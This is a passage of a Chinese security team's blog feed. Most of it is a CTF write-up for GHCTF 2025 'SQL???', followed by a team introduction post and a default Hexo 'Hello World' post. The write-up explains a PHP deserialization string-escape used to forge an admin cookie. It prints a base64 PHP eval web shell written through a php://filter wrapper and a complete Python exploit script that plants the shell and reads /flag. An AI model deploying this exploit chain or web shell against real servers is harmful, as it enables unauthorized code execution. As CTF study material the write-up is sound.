if($_POST[&#39;txt&#39;]||$_POST[&#39;filename&#39;])&#123;        echo &quot;&lt;h1&gt;权限不足，写入失败&lt;h1&gt;&quot;;&#125;    &#125;&#125; else &#123;    echo &#39;token验证失败&#39;;&#125;</code></pre><p>来看这一行</p><pre><code class="language-php">$userData = checkSignedCookie();if ($userData) &#123;    #echo $userData;    $user=unserialize($userData);    #var_dump($user);    if($user-&gt;isadmin)&#123;        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);        echo $tmp;        if($_POST[&#39;txt&#39;]) &#123;        $content = &#39;&lt;?php exit; ?&gt;&#39;;$content .= $_POST[&#39;txt&#39;];file_put_contents($_POST[&#39;filename&#39;], $content);        &#125;    &#125;    else&#123;        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);        echo $tmp;    if($_POST[&#39;txt&#39;]||$_POST[&#39;filename&#39;])&#123;        echo &quot;&lt;h1&gt;权限不足，写入失败&lt;h1&gt;&quot;;&#125;</code></pre><p>这里很明显有一个文件写入的操作，只要绕过<?php exit; ?>即可执行命令</p><p>但是这个文件写入又必须是admin，不然就会提示没有权限</p><p>可以知道<br>首先是获得session然后解密，将解密内容进行反序列话，然后调用反序列化实例的isadmin方法。首先我们不知道密钥值是多少所以无法直接通过伪造sseion来伪造admin。</p><p>查看login.php</p><pre><code class="language-python">&lt;?phpini_set(&#39;display_errors&#39;, 0);error_reporting(0);include &quot;waf.php&quot;;include &quot;class.php&quot;;include &quot;db.php&quot;;$username=$_POST[&quot;username&quot;];$password=$_POST[&quot;password&quot;];$SQL=new Database();function login($db,$username,$password)&#123;    $data=$db-&gt;query(&quot;SELECT * FROM users WHERE username = ?&quot;,[$username]);    if(empty($data))&#123;        die(&quot;&lt;script&gt;alert(&#39;用户不存在&#39;)&lt;/script&gt;&lt;script&gt;window.location.href = &#39;index.html&#39;&lt;/script&gt;&quot;);    &#125;    if($data[0][&#39;password&#39;]!==md5($password))&#123;        die(&quot;&lt;script&gt;alert(&#39;密码错误&#39;)&lt;/script&gt;&lt;script&gt;window.location.href = &#39;index.html&#39;&lt;/script&gt;&quot;);    &#125;    if($data[0][&#39;username&#39;]===&#39;admin&#39;) &#123;        $user = new User($username, true);    &#125;    else&#123;        $user = new User($username, false);    &#125;    return $user;&#125;function setSignedCookie($serializedData, $cookieName = &#39;user_token&#39;, $secretKey = &#39;fake_secretKey&#39;) &#123;    $signature = hash_hmac(&#39;sha256&#39;, $serializedData, $secretKey);    $token = base64_encode($serializedData . &#39;|&#39; . $signature);    setcookie($cookieName, $token, time() + 3600, &quot;/&quot;);  // 设置有效期为1小时&#125;$User=login($SQL,$username,$password);$User_ser=waf(serialize($User));setSignedCookie($User_ser);header(&quot;Location: dashboard.php&quot;);?&gt;</code></pre><p>可以发现在login方法中最后返回的是一个user类，</p><pre><code class="language-python">return $user;</code></pre><p>随后再将这个类进行序列化并传入waf方法检测</p><p>然后使用setSignedCookie()方法进行加密</p><pre><code class="language-python">function setSignedCookie($serializedData, $cookieName = &#39;user_token&#39;, $secretKey = &#39;fake_secretKey&#39;) &#123;    $signature = hash_hmac(&#39;sha256&#39;, $serializedData, $secretKey);    $token = base64_encode($serializedData . &#39;|&#39; . $signature);    setcookie($cookieName, $token, time() + 3600, &quot;/&quot;);  // 设置有效期为1小时&#125;</code></pre><p>再去看看waf.php</p><pre><code class="language-python">&lt;?phpfunction waf($c)&#123;    $lists=[&quot;flag&quot;,&quot;&#39;&quot;,&quot;\\&quot;,&quot;sleep&quot;,&quot;and&quot;,&quot;||&quot;,&quot;&amp;&amp;&quot;,&quot;select&quot;,&quot;union&quot;];    foreach($lists as $list)&#123;        $c=str_replace($list,&quot;error&quot;,$c);    &#125;    #echo $c;    return $c;&#125;</code></pre><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a><font style="color:rgb(38,38,38);">字符串逃逸</font></h3><ul><li>遍历黑名单，将每个危险词替换为”error”</li><li>示例：输入<code>&#39; UNION SELECT flag</code> → 输出<code>error UNION SELECT error</code></li></ul><p>这里我猜测存在非预期解</p><p>因为waf的过滤并不完整<code>str_replace</code>区分大小写，那是不是可以直接进行sql注入</p><p>非预期解的思路就提供到这里，有兴趣的可以去试试</p><h4 id="字符逃逸的原理"><a href="#字符逃逸的原理" class="headerlink" title="字符逃逸的原理"></a>字符逃逸的原理</h4><p><font style="color:rgb(76, 73, 72);">首先我们要知道反序列的结束位置。当反序列化遇到</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">时就会停止。注意</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">是不能包含再字符串里的即像</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;s:5:&quot;lll;&#125;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">前一个</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">是字符串的第4,5个字符，这就导致了其无法将反序列提前结束。<br></font><font style="color:rgb(76, 73, 72);">但是如果由于waf导致字符变多或者减少这就会导致，原本应该被解析为字符的字符被解析为特殊字符，使得反序列的结果被更改。</font></p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p><font style="color:rgb(76, 73, 72);">还是拿上面的函数来作为waf来解释</font></p><pre><code class="language-php">&lt;?php  function black_list($str)&#123;  $str=preg_replace(&#39;/flag/i&#39;,&#39;hacker~&#39;,$str);return $str;&#125;class E&#123;  public $a=&#39;flag&quot;;&#125;&#39;;  public $b=&quot;lalalalala&quot;;&#125;$a=serialize(new E());$a=black_list($a)</code></pre><p><font style="color:rgb(76, 73, 72);">上面的代码就存在字符逃逸字符增多的漏洞<br></font><font style="color:rgb(76, 73, 72);">我们要利用修改</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;$a&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">的值来尝试修改$b的值。</font></p><pre><code class="language-php">O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;hacker~&quot;;&#125;;s:1:&quot;b&quot;;s:10:&quot;lalalalala&quot;;&#125;</code></pre><p><font style="color:rgb(76, 73, 72);">我们可以看到上面的的flag变成了</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;hacker~&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">正好和</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;flag&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">的长度相同那么这就导致了hacker~被识别为了字符串而</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">被识别为了特殊字符。这就导致了反序列是遇到了</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">提前结束。这就是waf错误的将反序列的的字符增多导致了</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">逃逸出字符串被解析为反序列语句。</font><br><font style="color:rgb(76, 73, 72);">那么我们可以将</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">进行更改更改成</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:1:&quot;b&quot;;s:10:&quot;hahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">如果这句话被逃逸就会造成反序列的结果被更改即类的属性被更改。</font><br><font style="color:rgb(76, 73, 72);">如果要使</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">逃逸就要使pop链再被waf更改后的字符增多相同字符数。如</font></p><pre><code class="language-php">O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:64:&quot;flagflagflagflagflagflagflagflag&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:10:&quot;lalalalala&quot;;&#125;</code></pre><p><font style="color:rgb(76, 73, 72);">我们传入的</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;$a&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">值为</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;flagflagflagflagflagflagflagflag&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">传入了8个flag再经过waf后变为</font></p><pre><code class="language-php">O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:64:&quot;hacker~hacker~hacker~hacker~hacker~hacker~hacker~hacker~&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:10:&quot;lalalalala&quot;;&#125;</code></pre><p><font style="color:rgb(76, 73, 72);">替换后的字符正好为64个即多出来的字符数整好为需要逃逸的字符数。导致</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">逃逸这就使得</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">闭合前一个引号</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">被解析为反序列化链。这就使得被解析后的b变为了hhhhhahahaha而不是lalalalalala。</font></p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><font style="color:rgb(76, 73, 72);">waf函数是对关键字进行替换，这就导致了序列化的字符数量发生了改变，从而导致了字符串逃逸。</font></p><p><font style="color:rgb(76, 73, 72);">我们想要伪造的其实是类似于如下的序列化字符，用户名无所谓，但是isadmin要为true(判断是否为管理员，因为只有管理员才有写入权限)</font></p><p><font style="color:rgb(76, 73, 72);">构建以下序列化</font></p><pre><code class="language-php">&lt;?phpclass User&#123;    public $username;    public $isadmin;    public function __construct($username,$isadmin)    &#123;        $this-&gt;username=$username;        $this-&gt;isadmin=$isadmin;    &#125;&#125;$user = new User(&quot;zerotrace&quot;, true);echo serialize($user);#输出O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:9:&quot;zerotrace&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;</code></pre><p><font style="color:rgb(76, 73, 72);">那么我们输入的username就应该是xxxxxx”;s:7:”isadmin”;b:1;}。前面的xxxxx经过waf后会变多21个从而把后面的</font><code>&lt;font style=&quot;color:rgb(244, 116, 102);&quot;&gt;&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&lt;/font&gt;</code><font style="color:rgb(76, 73, 72);">逃逸出去<br></font><font style="color:rgb(76, 73, 72);">那么xxxx就可以是flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag。21个flag会被替换成21个error。</font></p><p>那么思路就很清晰了，我们注册一个字符串逃逸伪造admin的用户名如下</p><pre><code class="language-php">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;</code></pre><p><img src="1742541181145-48f5cb2a-8cbb-4b19-93d9-9414db0415fb.png" loading="lazy"></p><p>成功伪造admin</p><p>使用伪协议写入文件</p><pre><code class="language-php">filename=php://filter/convert.base64-decode/resource=/var/www/html/1.php&amp;txt=aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==</code></pre><p>蚁剑连接</p><p><img src="1742541250329-3feb7b36-2972-41d3-a79a-6be769e089ac.png" loading="lazy"></p><p><img src="1742541278009-4d0f89ba-7d63-4468-9193-3f8e4438336e.png" loading="lazy"></p><p>也可以使用exp直接梭哈</p><pre><code class="language-python">import requestsdef exp(url):    data=&#123;&quot;username&quot;:&#39;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&#39;,&quot;password&quot;:&quot;123456&quot;&#125;    r=requests.post(url+&quot;register.php&quot;,data=data)    #print(r.text)    session = requests.Session()    login_response = session.post(url+&quot;login.php&quot;, data=data)    shell=&#123;&quot;filename&quot;:&quot;php://filter/convert.base64-decode/resource=/var/www/html/shell.php&quot;,&quot;txt&quot;:&quot;aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==&quot;&#125;    protected_response = session.post(url+&quot;dashboard.php&quot;,data=shell)    response = requests.post(url+&quot;shell.php&quot;,data=&#123;&quot;123&quot;:&quot;system(&#39;cat /flag&#39;);&quot;&#125;)    print(response.text)if __name__==&quot;__main__&quot;:    url=&quot;http://node2.anna.nssctf.cn:28932/&quot;    exp(url)</code></pre><p><img src="1742526871287-3b615f13-a594-4150-8208-72e77b2480fa.png" loading="lazy"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GHCTF-2025-SQL&quot;&gt;&lt;a href=&quot;#GHCTF-2025-SQL&quot; class=&quot;headerlink&quot; title=&quot;[GHCTF 2025]SQL???&quot;&gt;&lt;/a&gt;[GHCTF 2025]SQL???&lt;/h1&gt;&lt;h2 id=&quot;题目链接：&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="Sec203Team" scheme="http://example.com/categories/Sec203Team/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>欢迎来到203</title>
    <link href="http://example.com/article/2025/03/welcome-203.html/"/>
    <id>http://example.com/article/2025/03/welcome-203.html/</id>
    <published>2025-03-09T07:41:00.000Z</published>
    <updated>2025-03-13T10:49:08.955Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sec203Team：用技术守护网络安全的小分队"><a href="#Sec203Team：用技术守护网络安全的小分队" class="headerlink" title="Sec203Team：用技术守护网络安全的小分队"></a>Sec203Team：用技术守护网络安全的小分队</h1><h2 id="🏢-关于我们"><a href="#🏢-关于我们" class="headerlink" title="🏢 关于我们"></a>🏢 关于我们</h2><p>我们是一群驻扎在203办公室的网络安全爱好者，就像数字世界的”安全卫士”。每天在这里研究如何防范网络攻击、挖掘系统漏洞、破解安全难题。无论你是想了解网络安全知识，还是遇到技术难题，都能在我们这里找到答案。</p><h2 id="🌟-我们擅长什么"><a href="#🌟-我们擅长什么" class="headerlink" title="🌟 我们擅长什么"></a>🌟 我们擅长什么</h2><h3 id="🛡️-四大核心领域"><a href="#🛡️-四大核心领域" class="headerlink" title="🛡️ 四大核心领域"></a>🛡️ <strong>四大核心领域</strong></h3><ul><li><strong>CTF竞赛</strong>：像解谜游戏一样破解各种安全挑战</li><li><strong>漏洞挖掘</strong>：像侦探一样找出系统隐藏的安全漏洞</li><li><strong>逆向分析</strong>：像拆解玩具一样研究恶意软件的工作原理</li><li><strong>网络防护</strong>：像建筑师一样设计安全的网络配置方案</li></ul><h3 id="📚-我们的工具箱"><a href="#📚-我们的工具箱" class="headerlink" title="📚 我们的工具箱"></a>📚 <strong>我们的工具箱</strong></h3><ul><li>积累了丰富的漏洞案例库（可以理解为安全问题的百科全书）</li><li>自主研发了自动化检测工具（就像网络世界的”安检仪”）</li><li>整理了常见攻击的防御手册（遇到问题随时查的指南）</li></ul><h3 id="⏱️-快速响应服务"><a href="#⏱️-快速响应服务" class="headerlink" title="⏱️ 快速响应服务"></a>⏱️ <strong>快速响应服务</strong></h3><p>发现安全问题不用慌，我们有一套标准应对流程：</p><ol><li>快速定位问题 → 2. 验证漏洞风险 → 3. 制作测试工具 → 4. 提供修复方案</li></ol><h2 id="🏅-我们的成绩单"><a href="#🏅-我们的成绩单" class="headerlink" title="🏅 我们的成绩单"></a>🏅 我们的成绩单</h2><ul><li>在重庆市大学生信息安全竞赛中获得前三（2023）</li><li>发现并报告了多个重要系统漏洞（就像网络世界的”啄木鸟”）</li><li>成功破解过勒索病毒（帮企业找回被加密的文件）</li><li>为企业搭建安全演练环境（像建造网络攻防的”训练场”）</li></ul><h2 id="📆-最近在做的事"><a href="#📆-最近在做的事" class="headerlink" title="📆 最近在做的事"></a>📆 最近在做的事</h2><ul><li>帮银行系统做安全体检（发现并修复支付系统漏洞）</li><li>分析新型网络攻击手段（提前准备防御方案）</li><li>开发简单好用的安全检测工具（让小白也能检查系统安全）</li></ul><h2 id="🔮-未来计划"><a href="#🔮-未来计划" class="headerlink" title="🔮 未来计划"></a>🔮 未来计划</h2><ul><li>制作网络安全科普教程（让更多人了解安全知识）</li><li>开发智能安全助手（像有个安全专家随时在线）</li><li>建立安全预警系统（提前发现潜在风险）</li></ul><blockquote><p>“在203办公室，我们用键盘搭建防线，用代码守护安全” —— 团队格言</p></blockquote><p>📩 随时找我们：<a href="mailto:&#x73;&#101;&#99;&#117;&#114;&#105;&#116;&#121;&#x40;&#x73;&#101;&#x63;&#x32;&#x30;&#51;&#116;&#101;&#x61;&#x6d;&#x2e;&#99;&#111;&#109;">security@sec203team.com</a><br>💻 看看我们的作品：github.com&#x2F;sec203team</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Sec203Team：用技术守护网络安全的小分队&quot;&gt;&lt;a href=&quot;#Sec203Team：用技术守护网络安全的小分队&quot; class=&quot;headerlink&quot; title=&quot;Sec203Team：用技术守护网络安全的小分队&quot;&gt;&lt;/a&gt;Sec203Team：用技术</summary>
      
    
    
    
    <category term="Sec203Team" scheme="http://example.com/categories/Sec203Team/"/>
    
    
    <category term="-简介 -203" scheme="http://example.com/tags/%E7%AE%80%E4%BB%8B-203/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/article/2025/03/undefined.html/"/>
    <id>http://example.com/article/2025/03/undefined.html/</id>
    <published>2025-03-09T07:19:06.119Z</published>
    <updated>2025-03-08T07:34:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="language-bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
